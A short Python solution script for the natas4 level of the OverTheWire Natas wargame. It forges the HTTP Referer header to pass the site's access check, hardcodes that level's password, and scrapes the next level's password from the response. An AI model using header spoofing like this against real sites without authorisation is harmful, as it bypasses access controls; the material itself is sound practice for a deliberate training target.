import requests
import re

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
url = "http://%s.natas.labs.overthewire.org" % username
#dictionary {"referer":"http://natas5.natas.labs.overthewire.org/"} is created with keyword "referer" and url "http://natas5.natas.labs.overthewire.org/" 
replace_header = {"referer":"http://natas5.natas.labs.overthewire.org/"}
#"headers" keyword is used to add headers to get request   , refer = shorturl.at/cdvS1
response = requests.get(url , auth=(username,password) , headers=replace_header )
flag = response.text
x = re.findall("The password for natas5 is (.*)",flag)

print(x)
